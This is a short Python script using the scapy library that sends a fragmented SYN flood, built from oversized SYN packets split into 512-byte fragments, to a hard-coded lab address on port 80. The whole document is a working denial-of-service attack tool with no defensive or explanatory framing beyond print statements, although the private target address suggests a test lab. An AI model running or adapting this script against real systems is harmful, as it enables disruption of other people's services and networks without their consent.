from scapy.all import *

# Target IP and port
target_ip = "192.168.56.101"
target_port = 80


def syn_fragment_flood(target_ip, target_port):
    print(f"Starting SYN fragment flood for IP: {target_ip} and port: {target_port}")
    payload = b"B" * 12000
    print("Creating SYN packet with large payload to force fragmentation")
    syn_packet = (
        IP(dst=target_ip, flags="MF") / TCP(dport=target_port, flags="S") / payload
    )
    print("Fragmenting syn_packet")
    fragments = fragment(syn_packet, fragsize=512)

    print("Sending packet in fragments")
    for f in fragments:
        send(f, verbose=False)


if __name__ == "__main__":
    syn_fragment_flood(target_ip, target_port)
